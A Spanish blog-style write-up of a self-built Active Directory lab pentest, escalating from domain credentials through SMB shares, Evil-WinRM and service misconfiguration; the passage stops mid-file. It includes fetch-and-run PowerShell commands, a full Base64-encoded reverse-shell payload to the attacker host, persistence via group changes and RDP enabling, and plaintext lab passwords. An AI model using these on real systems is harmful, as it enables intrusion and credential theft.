@@ -1,0 +1,874 @@
+---
+title: "AD7 Writeup: De credenciales de dominio a Domain Admin"
+date: 2026-09-17 16:30:00 +0200
+categories: [Active Directory, Pentesting]
+tags: [active-directory, privesc, jenkins, bloodhound, smb, evil-winrm, powerview]
+img_path: /assets/img/posts/ad7-writeup/
+---
+
+> **Nota:** Este writeup documenta un laboratorio propio de Active Directory (`hack-academy.local`) montado con fines de aprendizaje. Todas las credenciales, IPs y nombres de host mostrados pertenecen a un entorno aislado y no representan sistemas de producción.
+{: .prompt-warning }
+
+Ok empezamos de entrada partimos con unas credenciales validas `eturner -p Ya-Boy14` la topologia que seguimos se presenta acontinuacion, de partida somos `Parrot` y tenemos alcance hasta CLIENT-1.
+
+![Topología de red del laboratorio AD7](01-topologia.png)
+
+---
+### Client-01
+
+Ok empezamos haciendo un escaneo con nmap buscando los puertos abiertos.
+```php
+❯ sudo nmap -sS -Pn -vvv --open --min-rate 5000 192.168.1.136  -oG port
+
+135/tcp  open  msrpc         syn-ack ttl 128
+139/tcp  open  netbios-ssn   syn-ack ttl 128
+445/tcp  open  microsoft-ds  syn-ack ttl 128
+3389/tcp open  ms-wbt-server syn-ack ttl 128
+5357/tcp open  wsdapi        syn-ack ttl 128
+5985/tcp open  wsman         syn-ack ttl 128
+MAC Address: 00:0C:29:04:95:9B (VMware)
+```
+
+Ok ahora observamos las versiones y servicios que corren para cada uno de esos puertos.
+```php
+❯ nmap -sCV -p135,139,445,3389,5357,5985 192.168.1.136 -oN target
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-09 19:45 CEST
+Nmap scan report for 192.168.1.136
+Host is up (0.0017s latency).
+
+PORT     STATE SERVICE       VERSION
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: HACK-ACADEMY
+|   NetBIOS_Domain_Name: HACK-ACADEMY
+|   NetBIOS_Computer_Name: CLIENT-1
+|   DNS_Domain_Name: hack-academy.local
+|   DNS_Computer_Name: CLIENT-1.hack-academy.local
+|   Product_Version: 10.0.19041
+|_  System_Time: 2026-09-10T02:45:36+00:00
+|_ssl-date: 2026-09-10T02:45:42+00:00; +9h00m01s from scanner time.
+| ssl-cert: Subject: commonName=CLIENT-1.hack-academy.local
+| Not valid before: 2026-04-19T14:02:45
+|_Not valid after:  2026-10-19T14:02:45
+5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Service Unavailable
+|_http-server-header: Microsoft-HTTPAPI/2.0
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2026-09-10T02:45:36
+|_  start_date: N/A
+|_clock-skew: mean: 9h00m00s, deviation: 0s, median: 9h00m00s
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+|_nbstat: NetBIOS name: CLIENT-1, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:04:95:9b (VMware)
+```
+
+---
+
+### NXC
+
+Comprobamos que las credenciales de eturner funcionan correctamente y permiten acceder al equipo CLIENT-1.
+```php
+❯ nxc smb 192.168.1.136 -u 'eturner' -p 'Ya-Boy14'
+SMB         192.168.1.136   445    CLIENT-1         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-1) (domain:hack-academy.local) (signing:False) (SMBv1:None)
+SMB         192.168.1.136   445    CLIENT-1         [+] hack-academy.local\eturner:Ya-Boy14 
+```
+
+Comprobamos que las credenciales de eturner los recursos que se estan compartiendo observamos tres a los cuales tenemos permisos de lectura.
+```php
+❯ nxc smb 192.168.1.136 -u 'eturner' -p 'Ya-Boy14' --shares
+SMB         192.168.1.136   445    CLIENT-1         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-1) (domain:hack-academy.local) (signing:False) (SMBv1:None)
+SMB         192.168.1.136   445    CLIENT-1         [+] hack-academy.local\eturner:Ya-Boy14 
+SMB         192.168.1.136   445    CLIENT-1         [*] Enumerated shares
+SMB         192.168.1.136   445    CLIENT-1         Share           Permissions     Remark
+SMB         192.168.1.136   445    CLIENT-1         -----           -----------     ------
+SMB         192.168.1.136   445    CLIENT-1         ADMIN$                          Remote Admin
+SMB         192.168.1.136   445    CLIENT-1         C$                              Default share
+SMB         192.168.1.136   445    CLIENT-1         InternalApps    READ            
+SMB         192.168.1.136   445    CLIENT-1         IPC$            READ            Remote IPC
+SMB         192.168.1.136   445    CLIENT-1         IT-Support      READ            
+```
+
+
+Enumeré los recursos compartidos por SMB y comprobé que eturner tiene acceso de lectura a InternalApps e IT-Support. También encontré y descargué cinco archivos, entre ellos scripts de PowerShell y archivos de texto.
+```php
+❯ nxc smb 192.168.1.136 -u 'eturner' -p 'Ya-Boy14'  --shares -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=.
+SMB         192.168.1.136   445    CLIENT-1         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-1) (domain:hack-academy.local) (signing:False) (SMBv1:None)
+SMB         192.168.1.136   445    CLIENT-1         [+] hack-academy.local\eturner:Ya-Boy14 
+SPIDER_PLUS 192.168.1.136   445    CLIENT-1         [*] Started module spidering_plus with the following options:
+SPIDER_PLUS 192.168.1.136   445    CLIENT-1         [*]  DOWNLOAD_FLAG: True
+SPIDER_PLUS 192.168.1.136   445    CLIENT-1         [*]     STATS_FLAG: True
+SPIDER_PLUS 192.168.1.136   445    CLIENT-1         [*] EXCLUDE_FILTER: ['print$', 'ipc$']
+SPIDER_PLUS 192.168.1.136   445    CLIENT-1         [*]   EXCLUDE_EXTS: ['ico', 'lnk']
+SPIDER_PLUS 192.168.1.136   445    CLIENT-1         [*]  MAX_FILE_SIZE: 50 KB
+SPIDER_PLUS 192.168.1.136   445    CLIENT-1         [*]  OUTPUT_FOLDER: .
+SMB         192.168.1.136   445    CLIENT-1         [*] Enumerated shares
+SMB         192.168.1.136   445    CLIENT-1         Share           Permissions     Remark
+SMB         192.168.1.136   445    CLIENT-1         -----           -----------     ------
+SMB         192.168.1.136   445    CLIENT-1         ADMIN$                          Remote Admin
+SMB         192.168.1.136   445    CLIENT-1         C$                              Default share
+SMB         192.168.1.136   445    CLIENT-1         InternalApps    READ            
+SMB         192.168.1.136   445    CLIENT-1         IPC$            READ            Remote IPC
+SMB         192.168.1.136   445    CLIENT-1         IT-Support      READ            
+SPIDER_PLUS 192.168.1.136   445    CLIENT-1         [+] Saved share-file metadata to "./192.168.1.136.json".
+SPIDER_PLUS 192.168.1.136   445    CLIENT-1         [*] SMB Shares:           5 (ADMIN$, C$, InternalApps, IPC$, IT-Support)
+SPIDER_PLUS 192.168.1.136   445    CLIENT-1         [*] SMB Readable Shares:  3 (InternalApps, IPC$, IT-Support)
+SPIDER_PLUS 192.168.1.136   445    CLIENT-1         [*] SMB Filtered Shares:  1
+SPIDER_PLUS 192.168.1.136   445    CLIENT-1         [*] Total folders found:  0
+SPIDER_PLUS 192.168.1.136   445    CLIENT-1         [*] Total files found:    5
+SPIDER_PLUS 192.168.1.136   445    CLIENT-1         [*] File size average:    268.2 B
+SPIDER_PLUS 192.168.1.136   445    CLIENT-1         [*] File size min:        119 B
+SPIDER_PLUS 192.168.1.136   445    CLIENT-1         [*] File size max:        637 B
+SPIDER_PLUS 192.168.1.136   445    CLIENT-1         [*] File unique exts:     2 (ps1, txt)
+SPIDER_PLUS 192.168.1.136   445    CLIENT-1         [*] Downloads successful: 5
+SPIDER_PLUS 192.168.1.136   445    CLIENT-1         [+] All files processed successfully.
+```
+
+
+El archivo deploy.ps1 tienes unas credenciales dentro de el.
+```php
+# WebAPI Deployment Script
+# Deploys the internal WebAPI service on CLIENT-1
+# Last modified: 2024-08-19
+$DeployUser = "hack-academy\svc_webapi"
+$DeployPass = "Andrew,3"
+$ServicePath = "C:\Services\WebAPI"
+$ServiceName = "WebAPIService"
+$SecurePass = ConvertTo-SecureString $DeployPass -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential($DeployUser, $SecurePass)
+Write-Host "[*] Deploying WebAPI service as $DeployUser..."
+Copy-Item "\\FILESERV01\deploy\webapi-svc.exe" -Destination $ServicePath -Credential $Cred
+sc.exe start $ServiceName
+Write-Host "[+] WebAPI deployment complete."
+```
+
+
+Comprobamos que podemos conectarnos ya que el usuario pertenece al remote Management Users, asi que ahora nos podemos conectar a la maquina directamente.
+```php
+❯ nxc wmi 192.168.1.136 -u 'svc_webapi' -p 'Andrew,3'
+RPC         192.168.1.136   135    CLIENT-1         [*] Windows 10 / Server 2019 Build 19041 (name:CLIENT-1) (domain:hack-academy.local)
+RPC         192.168.1.136   135    CLIENT-1         [+] hack-academy.local\svc_webapi:Andrew,3 
+```
+
+
+---
+
+### Evil-Winrm
+
+Nos conectamos y bueno ahora seria buscar escalar privilegios.
+```php
+❯ evil-winrm -i 192.168.1.136 -u 'svc_webapi' -p 'Andrew,3'
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\svc_webapi\Documents>
+```
+
+---
+
+### Privilege Escalation
+
+Vi los usuarios del sistema y encontré la cuenta svc_webapi, que tiene un archivo local.txt en su escritorio, es nuestra primera bandera
+```php
+*Evil-WinRM* PS C:\> tree /f /a C:\Users
+Folder PATH listing
+Volume serial number is 000000AF 5CBB:FFE4
+C:\USERS
++---Administrator
++---Nick
++---Public
+\---svc_webapi
+    +---Desktop
+    |       local.txt
+    |
+    +---Documents
+    +---Downloads
+    +---Favorites
+    +---Links
+    +---Music
+    +---Pictures
+    +---Saved Games
+    \---Videos
+*Evil-WinRM* PS C:\> 
+```
+
+
+**PowerUp** Primero utilizo `PowerUp` para realizar una enumeración automática de posibles vectores de escalada de privilegios locales. Con `wget -useb 192.168.1.135/PowerUp.ps1|iex;Invoke-AllChecks` descargo y ejecuto el script en memoria y lanzo `Invoke-AllChecks`, que revisa diferentes configuraciones vulnerables, como servicios, rutas de ejecutables, permisos, claves del registro, tareas programadas y posibles DLL hijacking. En este caso, varias comprobaciones relacionadas con servicios devuelven `Access denied`, pero PowerUp sí identifica una ruta potencialmente explotable en `C:\Users\svc_webapi\AppData\Local\Microsoft\WindowsApps`, indicando que podría utilizarse para un **DLL hijacking** mediante `wlbsctrl.dll`.
+```php
+*Evil-WinRM* PS C:\Temp> wget -useb 192.168.1.135/PowerUp.ps1|iex;Invoke-AllChecks
+
+[*] Running Invoke-AllChecks
+
+[*] Checking if user is in a local group with administrative privileges...
+
+[*] Checking for unquoted service paths...
+Access denied 
+At line:457 char:21
++     $VulnServices = Get-WmiObject -Class win32_service | Where-Object ...
++                     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException
+    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObjectCommand
+
+[*] Checking service executable and argument permissions...
+Access denied 
+At line:488 char:5
++     Get-WMIObject -Class win32_service | Where-Object {$_ -and $_.pat ...
++     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException
+    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObjectCommand
+
+[*] Checking service permissions...
+Access denied 
+At line:534 char:17
++     $Services = Get-WmiObject -Class win32_service | Where-Object {$_ ...
++                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException
+    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObjectCommand
+
+[*] Checking %PATH% for potentially hijackable .dll locations...
+
+HijackablePath : C:\Users\svc_webapi\AppData\Local\Microsoft\WindowsApps\
+AbuseFunction  : Write-HijackDll -OutputFile 'C:\Users\svc_webapi\AppData\Local\Microsoft\WindowsApps\\wlbsctrl.dll' -Command '...'
+
+[*] Checking for AlwaysInstallElevated registry key...
+
+[*] Checking for Autologon credentials in registry...
+
+[*] Checking for vulnerable registry autoruns and configs...
+
+[*] Checking for vulnerable schtask files/configs...
+
+[*] Checking for unattended install files...
+
+[*] Checking for encrypted web.config strings...
+
+[*] Checking for encrypted application pool and virtual directory passwords...
+```
+
+
+Con `icacls` comprobé los permisos de la carpeta y confirmé que `svc_webapi` tiene control total sobre ella. Después, con `"test" | Out-File ...` creé un archivo de prueba dentro de la carpeta, y con `dir` comprobé que el archivo realmente se creó. Por tanto, confirmé que `svc_webapi` puede escribir en esa ubicación. Esto confirma el hallazgo de PowerUp, aunque todavía habría que comprobar si algún proceso con más privilegios utiliza esa carpeta para cargar una DLL.
+```php
+*Evil-WinRM* PS C:\> icacls "C:\Users\svc_webapi\AppData\Local\Microsoft\WindowsApps"
+C:\Users\svc_webapi\AppData\Local\Microsoft\WindowsApps NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+                                                        BUILTIN\Administrators:(I)(OI)(CI)(F)
+                                                        HACK-ACADEMY\svc_webapi:(I)(OI)(CI)(F)
+                                                        CLIENT-1\Nick:(I)(OI)(CI)(F)
+
+Successfully processed 1 files; Failed processing 0 files
+*Evil-WinRM* PS C:\> "test" | Out-File "C:\Users\svc_webapi\AppData\Local\Microsoft\WindowsApps\test.txt"
+*Evil-WinRM* PS C:\> dir C:\Users\svc_webapi\AppData\Local\Microsoft\WindowsApps\
+
+
+    Directory: C:\Users\svc_webapi\AppData\Local\Microsoft\WindowsApps
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----          9/9/2026   8:23 PM             14 test.txt
+
+
+*Evil-WinRM* PS C:\> 
+```
+
+---
+
+**PrivescCheck** Después utilizo `PrivescCheck` para realizar una segunda enumeración y comprobar si los resultados anteriores tienen realmente potencial de escalada. Con `wget -useb 192.168.1.135/PrivescCheck.ps1|iex;Invoke-PrivescCheck` ejecuto el script y reviso la información relacionada con el usuario, grupos, privilegios, variables de entorno, servicios y otros vectores de escalada. 
+En este caso, `svc_webapi` tiene una integridad `Medium`, no dispone de privilegios especialmente interesantes y no aparecen drivers vulnerables. Sin embargo, `PrivescCheck` encuentra algo mucho más relevante, el servicio `WebAPIService` se ejecuta como `LocalSystem` y el usuario `HACK-ACADEMY\svc_webapi` tiene permisos `AllAccess` sobre dicho servicio, por lo que lo marca como **Vulnerable - Severity High**.
+```php
+Evil-WinRM* PS C:\Users\svc_webapi\Documents> wget -useb 192.168.1.135/PrivescCheck.ps1|iex;Invoke-PrivescCheck
+
+Name              : WebAPIService
+DisplayName       : Web API Service
+User              : LocalSystem
+ImagePath         : C:\Services\WebAPI\webapi-svc.exe
+StartMode         : Manual
+Type              : Win32OwnProcess
+RegistryKey       : HKLM\SYSTEM\CurrentControlSet\Services
+RegistryPath      : HKLM\SYSTEM\CurrentControlSet\Services\WebAPIService
+Status            : Stopped
+UserCanStart      : False
+UserCanStop       : False
+IdentityReference : HACK-ACADEMY\svc_webapi (S-1-5-21-1006770658-2633334449-451426994-1103)
+Permissions       : AllAccess
+
+[*] Status: Vulnerable - Severity: High - Execution time: 00:00:01.355
+```
+
+
+**Relacionando ambos resultados** Aunque PowerUp encuentra inicialmente un posible DLL hijacking, el resultado más interesante aparece al contrastarlo con `PrivescCheck`. El servicio `WebAPIService` se ejecuta con `LocalSystem`, pero nuestro usuario `svc_webapi` tiene permisos `AllAccess` sobre él, lo que significa que existe un camino directo de escalada mediante la manipulación del servicio. La comprobación adicional con `sc.exe query IKEEXT` devuelve `Access is denied`, por lo que no puedo enumerar ese servicio concreto con `sc.exe`; esto no contradice el hallazgo de `WebAPIService`, ya que `PrivescCheck` está comprobando específicamente los permisos efectivos que tiene nuestro usuario sobre cada servicio. 
+
+**La diferencia principal entre ambas herramientas está en cómo realizan la enumeración** `PowerUp` es un framework de PowerShell orientado específicamente a detectar configuraciones comunes de **Windows que pueden ser explotadas para privilege escalation**, utilizando comandos y funcionalidades nativas de PowerShell/WMI/Registry y realizando comprobaciones automatizadas sobre diferentes vectores. Por otro lado, `PrivescCheck` también utiliza principalmente **mecanismos nativos de Windows y PowerShell**, pero está más orientado a realizar una auditoría amplia y detallada del sistema, recopilando información sobre el usuario, grupos, privilegios, servicios, registro, tareas, variables de entorno, drivers, etc., y clasificando los resultados según su impacto. 
+Por eso es útil utilizar ambas`PowerUp` permite encontrar rápidamente posibles vectores de explotación, mientras que `PrivescCheck` proporciona una segunda perspectiva y más contexto para validar y priorizar los hallazgos. En este caso, aunque PowerUp detecta el posible DLL hijacking, `PrivescCheck` identifica un vector más claro y de mayor impacto: `svc_webapi` `WebAPIService`  `LocalSystem`, ya que los permisos `AllAccess` sobre el servicio proporcionan el camino de escalada más directo.
+
+
+---
+
+Después de la enumeración con **PowerUp** y **PrivescCheck**, sabemos que `svc_webapi` tiene permisos `AllAccess` sobre `WebAPIService`, un servicio que se ejecuta como `LocalSystem`. Antes de intentar explotar este servicio, preparo un canal de comunicación con mi máquina para poder trabajar más cómodamente durante la escalada.
+
+Para ello creo un **payload de PowerShell** que se conecta a `192.168.1.135:4444` y permite enviar comandos y recibir sus resultados. Después convierto el payload a **Base64** para poder ejecutarlo posteriormente mediante PowerShell. En este punto todavía **no hemos conseguido una escalada**. Simplemente hemos preparado el canal que utilizaremos para continuar con la explotación.
+
+La situación actual es `svc_webapi` → `WebAPIService` → `LocalSystem` → **posible escalada**,  El siguiente paso será aprovechar los permisos `AllAccess` que tenemos sobre `WebAPIService` para intentar conseguir ejecución como `LocalSystem`.
+```php
+*Evil-WinRM* PS C:\Temp> $ip = '192.168.1.135'
+*Evil-WinRM* PS C:\Temp> $port = '4444'
+*Evil-WinRM* PS C:\Temp> $payload = "`$c=New-Object System.Net.Sockets.TCPClient('$ip',$port);`$s=`$c.GetStream();[byte[]]`$b=0..65535|%{0};while((`$i=`$s.Read(`$b,0,`$b.Length)) -ne 0){`$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$b,0,`$i);`$sb=(iex `$d 2>&1|Out-String );`$sb2=`$sb+'PS '+(pwd).Path+'> ';`$sbt=([text.encoding]::ASCII).GetBytes(`$sb2);`$s.Write(`$sbt,0,`$sbt.Length);`$s.Flush()};`$c.Close()"
+
+*Evil-WinRM* PS C:\Temp> $bytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
+*Evil-WinRM* PS C:\Temp> $encoded = [Convert]::ToBase64String($bytes)
+*Evil-WinRM* PS C:\Temp> 
+*Evil-WinRM* PS C:\Temp> Write-Output $encoded
+JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAnADEAOQAyAC4AMQA2ADgALgAxAC4AMQAzADUAJwAsADQANAA0ADQAKQA7ACQAcwA9ACQAYwAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAPQAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAPQAkAHMALgBSAGUAYQBkACgAJABiACwAMAAsACQAYgAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAJABkAD0AKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgAsADAALAAkAGkAKQA7ACQAcwBiAD0AKABpAGUAeAAgACQAZAAgADIAPgAmADEAfABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBiADIAPQAkAHMAYgArACcAUABTACAAJwArACgAcAB3AGQAKQAuAFAAYQB0AGgAKwAnAD4AIAAnADsAJABzAGIAdAA9ACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGIAMgApADsAJABzAC4AVwByAGkAdABlACgAJABzAGIAdAAsADAALAAkAHMAYgB0AC4ATABlAG4AZwB0AGgAKQA7ACQAcwAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwAuAEMAbABvAHMAZQAoACkA
+*Evil-WinRM* PS C:\Temp> 
+```
+
+---
+
+Luego de crear los componentes nos enviamos una shell donde ahora ya no somos el usuario normal si no que ya somos `nt authority\system`
+![Shell reverso ejecutándose como NT AUTHORITY\SYSTEM](02-shell-system.png)
+
+----
+
+### Post Explotacion
+
+Con estos comandos añado `HACK-ACADEMY\svc_webapi` al grupo de **Administrators** y al de **Remote Desktop Users**, para que la cuenta tenga privilegios administrativos y pueda conectarse mediante RDP. Después habilito las conexiones RDP y permito el tráfico correspondiente en el Firewall de Windows. De esta forma puedo utilizar `svc_webapi` para **conectarme remotamente a esta máquina con privilegios de administrador**.
+```php
+PS C:\Windows\system32> Add-LocalGroupMember -Group "Administrators" -Member "HACK-ACADEMY\svc_webapi"
+PS C:\Windows\system32> Add-LocalGroupMember -Group "Remote Desktop Users" -Member "HACK-ACADEMY\svc_webapi"
+PS C:\Windows\system32> 
+PS C:\Windows\system32> Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
+PS C:\Windows\system32> Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+PS C:\Windows\system32> 
+```
+
+
+Me conecto a la máquina mediante **RDP utilizando Remmina**. Hasta este momento había estado trabajando mediante **Evil-WinRM**, es decir, ejecutando comandos remotamente desde mi máquina a través de WinRM. Ahora el contexto cambia. La diferencia es que con **WinRM** estoy controlando la máquina de forma remota mediante una consola de PowerShell. Aunque puedo ejecutar muchos comandos y herramientas, sigo trabajando a través de una sesión remota. Con **RDP**, en cambio, tengo una sesión interactiva completa de Windows, como si estuviera sentado delante de la máquina
+
+Este cambio de contexto es importante para la siguiente fase. Ahora puedo utilizar la máquina comprometida como **punto de apoyo** para realizar reconocimiento interno y estudiar qué otros equipos, servicios y recursos existen en el entorno. A partir de aquí comienzo a investigar las posibilidades de **movimiento lateral y pivoting** hacia las demás máquinas.
+![Sesión RDP establecida con Remmina](03-rdp-conexion.png)
+
+---
+
+Nos transferimos PowerView ya que este usario es un usuario de dominio no es un usuario local.
+```python
+PS C:\Temp> Invoke-WebRequest http://192.168.1.135/PowerView.ps1 -OutFile C:\Temp\PowerView.ps1
+```
+
+---
+
+Con `Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass` permito temporalmente la ejecución de scripts de PowerShell **solo durante esta sesión**, sin modificar la configuración permanente del sistema. Después utilizo `Import-Module .\PowerView.ps1` para cargar **PowerView** en la sesión actual y poder utilizar sus funciones de enumeración del dominio.
+```php
+PS C:\Temp> Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
+
+Execution Policy Change
+The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose you to the security risks described in the about_Execution_Policies help topic at
+https:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
+[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): Y
+PS C:\Temp>
+PS C:\Temp> Import-Module .\PowerView.ps1
+PS C:\Temp>
+```
+
+---
+
+
+Este comando me permite enumerar los equipos del dominio junto con información relevante para identificar su función y posibles configuraciones de seguridad. En este caso, **DC01** es el controlador de dominio y ejecuta **Windows Server 2022 Datacenter**, con la bandera `TRUSTED_FOR_DELEGATION`, lo que indica que está configurado para **Unconstrained Delegation**; además, sus múltiples SPNs son coherentes con los servicios de un DC, como LDAP y DNS. Por otro lado, **CLIENT-1** y **CLIENT-2** son estaciones de trabajo con **Windows 10 Pro (build 19045)** y aparecen como `WORKSTATION_TRUST_ACCOUNT`, mientras que sus SPNs incluyen `TERMSRV` y `WSMAN`, correspondientes a servicios de Escritorio Remoto y WinRM. El campo `msds-allowedtodelegateto` aparece vacío en los tres equipos, por lo que no se observa **Constrained Delegation** configurada mediante ese atributo.
+```php
+PS C:\Temp> Get-DomainComputer -Properties * | select Name,dnshostname,operatingsystem,operatingsystemversion,lastlogon,description,useraccountcontrol,serviceprincipalname,msds-allowedtodelegateto
+
+
+name                     : DC01
+dnshostname              : DC01.hack-academy.local
+operatingsystem          : Windows Server 2022 Datacenter Evaluation
+operatingsystemversion   : 10.0 (20348)
+lastlogon                : 9/11/2026 11:47:07 AM
+description              :
+useraccountcontrol       : SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION
+serviceprincipalname     : {Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/DC01.hack-academy.local, ldap/DC01.hack-academy.local/ForestDnsZones.hack-academy.local,
+                           ldap/DC01.hack-academy.local/DomainDnsZones.hack-academy.local, DNS/DC01.hack-academy.local...}
+msds-allowedtodelegateto :
+
+name                     : CLIENT-1
+dnshostname              : CLIENT-1.hack-academy.local
+operatingsystem          : Windows 10 Pro
+operatingsystemversion   : 10.0 (19045)
+lastlogon                : 9/11/2026 12:05:16 PM
+description              :
+useraccountcontrol       : WORKSTATION_TRUST_ACCOUNT
+serviceprincipalname     : {TERMSRV/CLIENT-1, TERMSRV/CLIENT-1.hack-academy.local, WSMAN/CLIENT-1, WSMAN/CLIENT-1.hack-academy.local...}
+msds-allowedtodelegateto :
+
+name                     : CLIENT-2
+dnshostname              : CLIENT-2.hack-academy.local
+operatingsystem          : Windows 10 Pro
+operatingsystemversion   : 10.0 (19045)
+lastlogon                : 9/11/2026 12:05:55 PM
+description              :
+useraccountcontrol       : WORKSTATION_TRUST_ACCOUNT
+serviceprincipalname     : {TERMSRV/CLIENT-2, TERMSRV/CLIENT-2.hack-academy.local, WSMAN/CLIENT-2, WSMAN/CLIENT-2.hack-academy.local...}
+msds-allowedtodelegateto :
+
+PS C:\Temp>
+```
+
+---
+
+El resultado muestra **cuándo se usaron las cuentas y cuándo cambiaron su contraseña**. `Administrator` y `svc_webapi` tienen actividad reciente, mientras que varias cuentas `svc_*` muestran `12/31/1600`, lo que normalmente indica que **nunca han iniciado sesión**. `eturner` tiene actividad reciente según `lastlogontimestamp` (**09/09/2026**), mientras que `kpatel` tuvo actividad anterior (**16/04/2026**). Finalmente, `pwdlastset` indica cuándo se estableció la contraseña. En resumen, me interesa principalmente detectar **cuentas activas, cuentas de servicio sin uso y fechas de contraseña**.
+```php
+PS C:\Temp> Get-DomainUser -Properties * | select samaccountname,lastlogon,lastlogontimestamp,pwdlastset
+
+samaccountname lastlogon             lastlogontimestamp   pwdlastset
+-------------- ---------             ------------------   ----------
+Administrator  9/10/2026 12:31:13 PM 9/9/2026 12:24:08 PM 4/13/2026 12:11:11 AM
+Guest          12/31/1600 4:00:00 PM                      12/31/1600 4:00:00 PM
+krbtgt         12/31/1600 4:00:00 PM                      4/13/2026 12:29:30 AM
+svc_webapi     9/11/2026 11:52:33 AM 9/9/2026 1:14:43 PM  4/13/2026 12:45:06 AM
+svc_admin      12/31/1600 4:00:00 PM                      4/13/2026 12:45:06 AM
+svc_reports    12/31/1600 4:00:00 PM                      4/13/2026 12:45:06 AM
+svc_legacy     12/31/1600 4:00:00 PM                      4/13/2026 12:45:06 AM
+svc_monitor    12/31/1600 4:00:00 PM                      4/13/2026 12:45:06 AM
+svc_update     12/31/1600 4:00:00 PM                      4/13/2026 12:45:06 AM
+eturner        12/31/1600 4:00:00 PM 9/9/2026 1:03:02 PM  4/13/2026 12:46:41 AM
+kpatel         12/31/1600 4:00:00 PM 4/16/2026 6:07:49 PM 4/13/2026 12:46:41 AM
+
+PS C:\Temp>
+```
+
+---
+
+### Credentials Hunting
+
+
+Credential Hunting**, Snaffler permitió identificar tres hallazgos relevantes: en `\\DC01.hack-academy.local\NETLOGON\update-agents.bat` se encontró una credencial almacenada en texto claro para la cuenta de servicio `hack-academy\svc_update`, utilizada para acceder al recurso `\\MGMT-SRV\agents$` y copiar archivos `.msi`; en `\\CLIENT-1.hack-academy.local\InternalApps\deploy.ps1` se encontró otra credencial en texto claro perteneciente a `hack-academy\svc_webapi`, utilizada para acceder a `\\FILESERV01\deploy\webapi-svc.exe` y desplegar el servicio `WebAPIService`; finalmente, en `\\DC01.hack-academy.local\SYSVOL\hack-academy.local\Policies\{F82E0F7A-E4F5-483E-8903-C80A1212F069}\User\Preferences\Groups\Groups.xml` se identificó una **Group Policy Preferences (GPP)** que añade a `HACK-ACADEMY\kpatel` al grupo local `Administrators` mediante un atributo `cpassword`. En conjunto, estos hallazgos proporcionan tanto **credenciales expuestas** como información sobre cuentas, servidores, recursos compartidos y privilegios locales que pueden ser relevantes para continuar la evaluación de Post-Exploitation.
+```php
+PS C:\Temp> .\Snaffler.exe -s -d hack-academy.local  -o snaffler.log -v data
+
+PS C:\> type "\\DC01.hack-academy.local\NETLOGON\update-agents.bat"
+@echo off
+REM DEPRECATED -- replaced by SCCM
+REM Last updated: 2022-11-03
+REM This script is no longer in use. Contact IT before running.
+
